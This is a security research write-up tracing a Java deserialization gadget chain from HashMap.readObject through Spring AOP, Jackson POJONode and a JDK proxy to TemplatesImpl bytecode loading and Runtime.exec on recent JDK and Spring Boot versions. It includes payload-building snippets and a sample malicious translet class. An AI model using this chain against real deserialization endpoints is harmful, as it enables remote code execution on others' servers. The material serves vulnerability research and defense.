---
title : "Finding Gadgets Like It's 2026: Auto-Trigger Deserialization Gadget Chain on JDK 17/21/25 and Spring Boot 3.2.x-4.0.5(EN)"
date : 2026-04-19 10:00:00 +0900
categories: [Research]
tags: [Java, Spring, Gadget, Unserialize]
---
# Victim Code

This chain assumes that the target server contains the following deserialization logic:

```java
new ObjectInputStream(input).readObject();
```

The moment this single line executes on the target server, the Java serialization byte stream we prepared begins to be reconstructed into an object graph. We place a pre-crafted HashMap-based payload into input ahead of time.

Java serialization byte streams include class descriptors. When the victim calls ObjectInputStream.readObject(), ObjectInputStream reads the stream, determines that the object being reconstructed is java.util.HashMap, and follows that class's deserialization path.

The important point here is that if the class being deserialized defines a private readObject(ObjectInputStream) method, the Java serialization mechanism invokes that method automatically. Since HashMap has its own readObject(), the chain begins at the following point:

```java
ObjectInputStream.readObject()
  → HashMap.readObject()
```

From the victim's perspective, only a single readObject() call was made. However, that call automatically triggers the internal logic of HashMap.readObject(), which opens the rest of the chain.

---

# 1. HashMap.readObject()

> Source: JDK - java.base module
> 
> 
> Path: jdk/src/java.base/share/classes/java/util/HashMap.java
> 

The starting point of the entire chain is HashMap.readObject(). When ObjectInputStream.readObject() is called and the object being deserialized is a HashMap, the Java serialization mechanism automatically invokes HashMap's custom readObject().

The relevant HashMap.readObject() code is as follows:

```java
private void readObject(ObjectInputStream s)
        throws IOException, ClassNotFoundException {

        ObjectInputStream.GetField fields = s.readFields();

        // Read loadFactor (ignore threshold)
        float lf = fields.get("loadFactor", 0.75f);
        if (lf <= 0 || Float.isNaN(lf))
            throw new InvalidObjectException("Illegal load factor: " + lf);

        lf = Math.clamp(lf, 0.25f, 4.0f);
        HashMap.UnsafeHolder.putLoadFactor(this, lf);

        reinitialize();

        s.readInt();                // Read and ignore number of buckets
        int mappings = s.readInt(); // Read number of mappings (size)
        if (mappings < 0) {
            throw new InvalidObjectException("Illegal mappings count: " + mappings);
        } else if (mappings == 0) {
            // use defaults
        } else if (mappings > 0) {
            double dc = Math.ceil(mappings / (double)lf);
            int cap = ((dc < DEFAULT_INITIAL_CAPACITY) ?
                       DEFAULT_INITIAL_CAPACITY :
                       (dc >= MAXIMUM_CAPACITY) ?
                       MAXIMUM_CAPACITY :
                       tableSizeFor((int)dc));
            float ft = (float)cap * lf;
            threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                         (int)ft : Integer.MAX_VALUE);

            // Check Map.Entry[].class since it's the nearest public type to
            // what we're actually creating.
            SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);
            @SuppressWarnings({"rawtypes","unchecked"})
            Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
            table = tab;

            // Read the keys and values, and put the mappings in the HashMap
            for (int i = 0; i < mappings; i++) {
                @SuppressWarnings("unchecked")
                    K key = (K) s.readObject();
                @SuppressWarnings("unchecked")
                    V value = (V) s.readObject();
                putVal(hash(key), key, value, false, false);
            }
        }
    }
```

The most important part of this chain is the loop at the very bottom:

```java
for (int i = 0; i < mappings; i++) {
    K key = (K) s.readObject();      // Reconstruct key from the byte stream
    V value = (V) s.readObject();    // Reconstruct value from the byte stream
    putVal(hash(key), key, value, false, false);  // ← The chain starts here
}
```

mappings is the number of key-value pairs stored in the HashMap. Since our payload contains two entries, mappings = 2. In other words, HashMap.readObject() reads two keys from the stream in sequence and reinserts them into the internal table by calling putVal().

At this point, hash(key) is called first:

```java
static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```

The two keys we planted are:

- key1 = HotSwappableTargetSource(target = POJONode) - inserted first
- key2 = HotSwappableTargetSource(target = XString) - inserted second

Because both keys are HotSwappableTargetSource, hash(key) ultimately calls HotSwappableTargetSource.hashCode().

Now look at putVal(). HashMap checks whether another key already exists in the same bucket and calls equals() if necessary.

```java
final V putVal(int hash, K key, V value, boolean onlyIfAbsent,
               boolean evict) {
    Node<K,V>[] tab; Node<K,V> p; int n, i;
    if ((tab = table) == null || (n = tab.length) == 0)
        n = (tab = resize()).length;
    if ((p = tab[i = (n - 1) & hash]) == null)
        tab[i] = newNode(hash, key, value, null);
    else {
        Node<K,V> e; K k;
        if (p.hash == hash &&
            ((k = p.key) == key || (key != null && key.equals(k))))
            e = p;
        ...
    }
}
```

HashMap internally stores entries in a Node[] table array, and each slot is called a bucket. The key line is:

```java
i = (n - 1) & hash
```

If the table size is the same and the hash values are the same, both keys always land in the same bucket index.

When the first key is inserted, the bucket is empty, so the key is inserted directly:

```java
First key = HotSwappableTargetSource(POJONode)
    -> compute hash
    -> bucket is empty
    -> insert directly
```

When the second key is inserted, the situation changes:

```java
Second key = HotSwappableTargetSource(XString)
    -> compute hash
    -> same hash as the first key
    -> enter the same bucket
    -> must compare against the existing key
    -> key.equals(existingKey) is called
```

In fact, putVal() invokes equals() under the following condition:

```java
if (p.hash == hash &&
    ((k = p.key) == key ||
     (key != null && key.equals(k))))
```

The evaluation order is:

1. p.hash == hash
    1. The first and second keys have the same hash, so this is true.
2. (k = p.key) == key
    1. They are different instances, so this is false.
3. key != null && key.equals(k)
    1. This ultimately calls key.equals(existingKey).

So the actual call is:

```java
HotSwappableTargetSource(XString).equals(HotSwappableTargetSource(POJONode))
```

This is where the chain moves to the next stage. The important point is that without the hash collision, this equals() call would never happen. This chain abuses HashMap's collision-handling logic to force an equals() invocation.

---

# 2. Hash Collision - HotSwappableTargetSource.hashCode()

> Source: Spring AOP - spring-aop-6.x.jar
> 
> 
> Path: spring-framework/spring-aop/src/main/java/org/springframework/aop/target/HotSwappableTargetSource.java
> 

In the previous step, we explained that equals() is called because both keys have the same hash. The reason is that HotSwappableTargetSource.hashCode() has a very unusual implementation:

```java
@Override
public int hashCode() {
    return HotSwappableTargetSource.class.hashCode();
}
```

Normally, an object's hashCode() depends on its internal state. For example:

```java
"hello".hashCode()
"world".hashCode()
-> different strings produce different hashes
```

But HotSwappableTargetSource does not use its internal target field at all. It returns only the hash of the HotSwappableTargetSource.class object. As a result, all of the following objects have the same hash value:

```java
new HotSwappableTargetSource(POJONode).hashCode()
new HotSwappableTargetSource(XString).hashCode()
new HotSwappableTargetSource("dummy").hashCode()
```

→ Result: HotSwappableTargetSource.class.hashCode()

Therefore, regardless of what each instance contains, every HotSwappableTargetSource object has the same hash value. From HashMap's point of view, all of them fall into the same bucket, and collision handling forces an equals() call.

That is the trigger mechanism of this chain. Unlike the JDK7u21 chain, which required carefully aligning hash values, HotSwappableTargetSource structurally acts as a key that always collides.

This class is useful for the chain because it satisfies three conditions at once:

1. It implements Serializable.
2. Its hashCode() is effectively constant.
3. Its equals() delegates to target.equals(...).

In other words, it can be deserialized, it guarantees a HashMap collision, and after the collision it forces equals() between the target objects we embedded.

---

# 3. HotSwappableTargetSource.equals() → XString.equals(POJONode)

> Source: Spring AOP - spring-aop-6.x.jar / JDK - java.xml module
> 
> 
> Path: spring-framework/spring-aop/src/main/java/org/springframework/aop/target/HotSwappableTargetSource.java, jdk/src/java.xml/share/classes/com/sun/org/apache/xpath/internal/objects/XString.java
> 

At the end of the previous step, the following call occurred:

```java
HotSwappableTargetSource(XString).equals(HotSwappableTargetSource(POJONode))
```

The implementation of HotSwappableTargetSource.equals() is:

```java
@Override
public boolean equals(@Nullable Object other) {
    return (this == other || (other instanceof HotSwappableTargetSource that &&
            this.target.equals(that.target)));
            // XString.equals(POJONode)
}
```

In other words, when two HotSwappableTargetSource objects are compared, the real comparison happens through the equals() method of the internal target objects.

At this point:

- this.target = XString
- that.target = POJONode

so XString.equals(POJONode) is called.

The insertion order is critical here. The key containing POJONode is inserted first and becomes the existing key. The key containing XString is inserted second and becomes the new key. HashMap calls equals() on the new key, so the direction is necessarily XString.equals(POJONode).

If the order were reversed, POJONode.equals(XString) would be called instead. In that case, POJONode.equals() checks the type of the other object and fails, so the chain does not proceed.

Now look at XString.equals():

```java
public boolean equals(Object obj2)
{
    if (null == obj2)
        return false;
    else if (obj2 instanceof XNodeSet)
        return obj2.equals(this);
    else if (obj2 instanceof XNumber)
        return obj2.equals(this);
    else
        return str().equals(obj2.toString());
}
```

obj2 is POJONode, so it is neither XNodeSet nor XNumber. Eventually execution reaches:

```java
return str().equals(obj2.toString());
```

→ It lands here → obj2.toString() is invoked

At this moment, the chain transitions from an equals() path to a toString() path:

```java
<actual call flow>
HotSwappableTargetSource.equals()
  → this.target.equals(that.target)
  → XString.equals(POJONode)
    → obj2.toString()
    → POJONode.toString()
```

This part of the chain matters because older payloads could directly call toString() using BadAttributeValueExpException. Starting with later JDK versions, that direct deserialization-time toString() trigger was removed. This chain bypasses that mitigation by routing the call through XString.equals().

---

# 4. POJONode.toString() → Jackson serialize → proxy.getOutputProperties()

In the immediately preceding stage, XString.equals(POJONode) was called, and the last line executed obj2.toString().

```java
// XString.java
public boolean equals(Object obj2)
{
    if (null == obj2)
        return false;
    else if (obj2 instanceof XNodeSet)
        return obj2.equals(this);
    else if (obj2 instanceof XNumber)
        return obj2.equals(this);
    else
        return str().equals(obj2.toString());
}
```

Here obj2 is POJONode, so POJONode.toString() is ultimately invoked. But POJONode itself does not define toString(), so by Java inheritance rules the call resolves to BaseJsonNode.toString().

```java
// BaseJsonNode.java
@Override
public String toString() {
    return InternalNodeMapper.nodeToString(this);
}
```

So POJONode.toString() is not just a simple string conversion. It flows into Jackson's internal helper InternalNodeMapper.nodeToString().

```java
// InternalNodeMapper.java
public static String nodeToString(JsonNode n) {
    try {
        return STD_WRITER.writeValueAsString(n);
    } catch (IOException e) {
        throw new RuntimeException(e);
    }
}
```

Here STD_WRITER is Jackson's ObjectWriter, and writeValueAsString() is ultimately called. Therefore, POJONode.toString() internally performs Jackson serialization. Jackson now needs to serialize POJONode as JSON, so it calls POJONode.serialize().

```java
// POJONode.java
@Override
public final void serialize(JsonGenerator gen, SerializerProvider ctxt) throws IOException
{
    if (_value == null) {
        ctxt.defaultSerializeNull(gen);
    } else if (_value instanceof JsonSerializable) {
        ((JsonSerializable) _value).serialize(gen, ctxt);
    } else {
        ctxt.defaultSerializeValue(_value, gen);
    }
}
```

The key line is the last one:

```java
ctxt.defaultSerializeValue(_value, gen);
```

In this chain, _value contains the Proxy(Templates) object we planted. The payload construction code looks like this:

```java
TemplatesImpl t = new TemplatesImpl();
setField(t, "_bytecodes", new byte[][]{makeEvil("/tmp/PWNED_AUTO.txt")});
setField(t, "_name", "die.verwandlung.Auto");
setField(t, "_tfactory", new TransformerFactoryImpl());
setField(t, "_class", null);

SingletonTargetSource sts = new SingletonTargetSource(t);
AdvisedSupport advised = new AdvisedSupport();
advised.setTargetSource(sts);
advised.setInterfaces(Templates.class);

Constructor<?> ctor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy")
    .getDeclaredConstructor(AdvisedSupport.class);
ctor.setAccessible(true);

Templates proxy = (Templates) Proxy.newProxyInstance(
    Templates.class.getClassLoader(),
    new Class[]{Templates.class, Serializable.class},
    (InvocationHandler) ctor.newInstance(advised));
```

And that proxy is wrapped directly inside POJONode:

```java
POJONode pojoNode = new POJONode(proxy);
```

After deserialization, the state is POJONode._value = Proxy(Templates).

When Jackson calls defaultSerializeValue(_value, gen), it treats _value as a normal Java bean and looks for getters to serialize as properties. Jackson's BeanPropertyWriter actually invokes getters reflectively as follows:

```java
// BeanPropertyWriter.java
final Object value = (_accessorMethod == null) ? _field.get(bean)
        : _accessorMethod.invoke(bean, (Object[]) null);
```

Since bean here is Proxy(Templates), Jackson introspects the public Templates interface implemented by the proxy, and during that process it discovers getOutputProperties().

The flow up to this point can be summarized as:

```java
XString.equals(POJONode)
  → POJONode.toString()
    → BaseJsonNode.toString()
      → InternalNodeMapper.nodeToString()
        → ObjectWriter.writeValueAsString()
          → POJONode.serialize()
            → ctxt.defaultSerializeValue(_value, gen)
              → Jackson serializes _value = Proxy(Templates) as a bean
              → getter discovery
              → proxy.getOutputProperties() is called
```

From here on, the chain leaves Jackson and enters the JDK Proxy + Spring AOP path.

## Bypassing the JPMS Module System - Why Use a Proxy

For Jackson to serialize _value, it must first introspect the class of that object. In practice, that means examining which getter methods it has.

If _value directly contained TemplatesImpl, the flow would look like this:

```java
Jackson calls _value.getClass()
→ returns TemplatesImpl.class
→ package: com.sun.org.apache.xalan.internal.xsltc.trax
→ package is not exported by the java.xml module
→ Jackson attempts to access methods on that class
→ IllegalAccessException
```

So serialization would fail with an access error.

But because _value contains a proxy object instead, the flow changes:

```java
Jackson calls _value.getClass()
→ returns jdk.proxy1.$Proxy0.class
→ package: jdk.proxy1 (exported package)
→ Jackson introspects based on the proxy interface (Templates)
→ discovers getter on Templates interface: getOutputProperties()
→ no direct module access problem here
```

The proxy class is dynamically generated by the JDK under the jdk.proxy1 package at runtime. Jackson can introspect the proxy through its public interface, and from there it discovers getOutputProperties() on Templates.

# proxy.getOutputProperties() → JdkDynamicAopProxy.invoke()

> Source: JDK - java.base module (Proxy) + Spring AOP - spring-aop-6.x.jar
> 
> 
> Path:
> 
> - jdk/src/java.base/share/classes/java/lang/reflect/Proxy.java
> - spring-framework/spring-aop/src/main/java/org/springframework/aop/framework/JdkDynamicAopProxy.java
> - spring-framework/spring-aop/src/main/java/org/springframework/aop/framework/AdvisedSupport.java
> - spring-framework/spring-aop/src/main/java/org/springframework/aop/target/SingletonTargetSource.java
> - spring-framework/spring-aop/src/main/java/org/springframework/aop/support/AopUtils.java

In the previous step, Jackson called proxy.getOutputProperties().

## Proxy → InvocationHandler

proxy is a JDK dynamic proxy object. The default behavior of Java proxies is to dispatch interface method calls to InvocationHandler.invoke(). The comment in Proxy.java states this directly:

```java
// Proxy.java
A method invocation on a proxy instance through one of its proxy
interfaces will be dispatched to the InvocationHandler#invoke
method of the instance's invocation handler
```

So when Jackson calls proxy.getOutputProperties(), the runtime internally turns it into:

```java
InvocationHandler.invoke(proxy, method=getOutputProperties, args=null)
```

During payload construction, we set the proxy's InvocationHandler to Spring AOP's JdkDynamicAopProxy:

```java
Templates proxy = (Templates) Proxy.newProxyInstance(
    Templates.class.getClassLoader(),
    new Class[]{Templates.class, Serializable.class},
    (InvocationHandler) ctor.newInstance(advised)
);
```

Therefore the call becomes:

proxy.getOutputProperties() → JdkDynamicAopProxy.invoke(proxy, method, args)

## JdkDynamicAopProxy.invoke()

JdkDynamicAopProxy is Spring AOP's core dispatcher. Because it implements InvocationHandler and is serializable, it can be embedded in the payload and still receive proxy calls after deserialization. Inside invoke(), Spring first handles a few special methods such as equals() and hashCode(), but getOutputProperties() is not one of those cases, so execution proceeds down the normal path.

The relevant logic is:

```java
// JdkDynamicAopProxy.java
target = targetSource.getTarget();
Class<?> targetClass = (target != null ? target.getClass() : null);
List<Object> chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass);

if (chain.isEmpty()) {
    Object[] argsToUse = AopProxyUtils.adaptArgumentsIfNecessary(method, args);
    retVal = AopUtils.invokeJoinpointUsingReflection(target, method, argsToUse);
}
```

In other words, JdkDynamicAopProxy retrieves the TargetSource from its internal configuration object, obtains the actual target object from it, and then reflectively forwards the incoming method invocation to that target.

## AdvisedSupport - The Wiring Object

this.advised is an AdvisedSupport object. It stores which interfaces the proxy implements, what the actual target is, and which TargetSource should be used.

We built the payload like this:

```java
AdvisedSupport advised = new AdvisedSupport();
advised.setTargetSource(sts);
advised.setInterfaces(Templates.class);
```

So this.advised.targetSource points to SingletonTargetSource, and the proxy implements the Templates interface.

## SingletonTargetSource.getTarget()

Now when targetSource.getTarget() is called, SingletonTargetSource.getTarget() executes:

```java
// SingletonTargetSource.java
private final Object target;

public SingletonTargetSource(Object target) {
    this.target = target;
}

@Override
public Object getTarget() {
    return this.target;
}
```

The critical point is that the target field is of type Object. That means it does not need to hold a specific framework type; it can hold any arbitrary object we want.

In this chain, we put TemplatesImpl there:

```java
SingletonTargetSource sts = new SingletonTargetSource(t);   // t = TemplatesImpl
```

As a result, getTarget() returns TemplatesImpl directly.

## method.invoke(TemplatesImpl)

Next, Spring forwards the method to the actual target object using AopUtils.invokeJoinpointUsingReflection():

```java
// AopUtils.java
public static Object invokeJoinpointUsingReflection(@Nullable Object target, Method method, Object[] args)
        throws Throwable {
    ReflectionUtils.makeAccessible(method);
    return method.invoke(target, args);
}
```

Here:

- method = Templates.getOutputProperties()
- target = TemplatesImpl

Since TemplatesImpl implements the public interface javax.xml.transform.Templates, reflective invocation through the interface method succeeds normally.

The key point is that Jackson never directly introspects TemplatesImpl. Jackson only sees Proxy(Templates). The actual call into the internal implementation class TemplatesImpl is carried out later by Spring AOP. That is why Jackson can eventually trigger the method without directly touching the internal implementation details of TemplatesImpl.

The flow can be summarized as:

```java
proxy.getOutputProperties()
  → JdkDynamicAopProxy.invoke()
    → this.advised.targetSource
    → SingletonTargetSource.getTarget()
    → target = TemplatesImpl
    → AopUtils.invokeJoinpointUsingReflection()
      → method.invoke(TemplatesImpl)
        → TemplatesImpl.getOutputProperties()
```

At this point, execution enters the sink inside TemplatesImpl.

# TemplatesImpl.getOutputProperties() → RCE

> Source: JDK - java.xml module
> 
> 
> Path:
> 
> - jdk/src/java.xml/share/classes/com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java
> - jdk/src/java.xml/share/classes/com/sun/org/apache/xalan/internal/xsltc/trax/TransformerFactoryImpl.java
> - jdk/src/java.base/share/classes/java/lang/ClassLoader.java
> - jdk/src/java.base/share/classes/java/lang/Runtime.java

At the end of the previous step, method.invoke(TemplatesImpl) reached TemplatesImpl.getOutputProperties(). On the surface it looks like a harmless getter, but internally it follows a dangerous path that loads and instantiates translet classes.

```java
// TemplatesImpl.java
public synchronized Properties getOutputProperties() {
    try {
        return newTransformer().getOutputProperties();
    } catch (TransformerConfigurationException e) {
        return null;
    }
}

<call flow>
getOutputProperties()
  → newTransformer()
    → getTransletInstance()
      → defineTransletClasses()
```

## The _bytecodes We Planted Ahead of Time

During payload construction, the attacker modifies internal fields of TemplatesImpl and inserts malicious bytecode:

```java
TemplatesImpl t = new TemplatesImpl();
setField(t, "_bytecodes", new byte[][]{makeEvil("/tmp/PWNED_AUTO.txt")});
setField(t, "_name", "die.verwandlung.Auto");
setField(t, "_tfactory", new TransformerFactoryImpl());
setField(t, "_class", null);
```

And the PoC's makeEvil() actually creates the die.verwandlung.Auto class and inserts its compiled bytecode into _bytecodes:

```java
// FullAutoChain3.java
static byte[] makeEvil(String p) throws Exception {
    String s = "package die.verwandlung;\\n" +
        "import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\\n" +
        "public class Auto extends AbstractTranslet {\\n" +
        "    static{try{Runtime.getRuntime().exec(new String[]{\\"touch\\",\\""+p+"\\"});}catch(Exception e){}}\\n" +
        "}\\n";
    ...
}
```

So this is not a class that originally existed on the victim's classpath. It is a byte array embedded in the payload that becomes a class dynamically at runtime.

## defineTransletClasses() - Defining the Translet Class

getTransletInstance() first calls defineTransletClasses() if _class == null:

```java
// TemplatesImpl.java
private Translet getTransletInstance()
    throws TransformerConfigurationException {
    try {
        if (_name == null) return null;

        if (_class == null) defineTransletClasses();

        AbstractTranslet translet = (AbstractTranslet)
                _class[_transletIndex].getConstructor().newInstance();
        ...
        return translet;
    }
    ...
}
```

This method turns the byte arrays stored in _bytecodes into actual JVM classes. On JDK 9+, it does not merely call defineClass(); it also performs dynamic module setup for translets.

```java
// TemplatesImpl.java
String mn = "jdk.translet";
String pn = _tfactory.getPackageName();

ModuleDescriptor descriptor =
    ModuleDescriptor.newModule(mn, Set.of(ModuleDescriptor.Modifier.SYNTHETIC))
                    .requires("java.xml")
                    .exports(pn, Set.of("java.xml"))
                    .build();

Module m = createModule(descriptor, loader);

for (int i = 0; i < classCount; i++) {
    _class[i] = loader.defineClass(_bytecodes[i], pd);
}
```

In other words, it creates a synthetic module named jdk.translet, exports the translet package toward java.xml, and then defines _bytecodes as real classes. The translet package name comes from the default configuration of TransformerFactoryImpl:

```java
// TransformerFactoryImpl.java
private static final String DEFAULT_TRANSLATE_PACKAGE = "die.verwandlung";
private String _packageName = DEFAULT_TRANSLATE_PACKAGE;
```

That is why the PoC names the malicious class die.verwandlung.Auto.

## Initialization Happens at newInstance(), Not Immediately at defineClass()

There is an important accuracy point here. defineClass() only defines the class. Actual class initialization (<clinit>) happens later, when the class is first actively used. In this chain, that moment is the following line inside getTransletInstance():

```java
AbstractTranslet translet = (AbstractTranslet)
        _class[_transletIndex].getConstructor().newInstance();
```

So the flow is:

```java
defineTransletClasses()
  → loader.defineClass(_bytecodes[i], pd)           // class definition
getTransletInstance()
  → _class[_transletIndex].getConstructor().newInstance()
    → class initialization (<clinit>)
```

Therefore, the direct trigger for RCE is not defineClass() itself, but the subsequent class initialization caused by newInstance().

## <clinit> → Runtime.exec() → RCE

The class we planted ahead of time contains a static {} block:

```java
public class Auto extends AbstractTranslet {
    static {
        Runtime.getRuntime().exec(...);
    }
}
```

As a result, when newInstance() triggers class initialization, the static {} block runs, Runtime.getRuntime().exec() is invoked, and execution reaches RCE.

```java
TemplatesImpl.getOutputProperties()
  → newTransformer()
    → getTransletInstance()
      → defineTransletClasses()
        → "jdk.translet" module creation
        → translet package export
        → loader.defineClass(_bytecodes[i], pd)
      → _class[_transletIndex].getConstructor().newInstance()
        → class initialization (<clinit>)
          → Runtime.getRuntime().exec()
            → RCE
```

# Full Chain

```java
Victim: new ObjectInputStream(input).readObject()
  → HashMap.readObject() → putVal()                          [JDK]
    → hash collision (HotSwappableTargetSource.hashCode() is constant) [Spring AOP]
    → HotSwappableTargetSource.equals()                      [Spring AOP]
      → XString.equals(POJONode)                             [JDK, java.xml]
        → obj2.toString()
        → POJONode.toString()                                [Jackson]
          → BaseJsonNode.toString()
          → InternalNodeMapper.nodeToString()
          → ObjectWriter.writeValueAsString()
          → POJONode.serialize()
          → ctxt.defaultSerializeValue(_value, gen)          (_value = Proxy(Templates))
            → Jackson recognizes getter on the Templates interface
            → proxy.getOutputProperties()                    [JDK Proxy]
              → JdkDynamicAopProxy.invoke()                  [Spring AOP]
                → AdvisedSupport.targetSource
                → SingletonTargetSource.getTarget()
                → target = TemplatesImpl
                → AopUtils.invokeJoinpointUsingReflection()
                  → method.invoke(TemplatesImpl)
                    → TemplatesImpl.getOutputProperties()    [JDK, java.xml]
                      → newTransformer()
                      → getTransletInstance()
                      → defineTransletClasses()
                        → "jdk.translet" module creation + export setup
                        → defineClass(_bytecodes[i])
                      → getConstructor().newInstance()
                        → <clinit>
                        → Runtime.getRuntime().exec()
                        → RCE
```
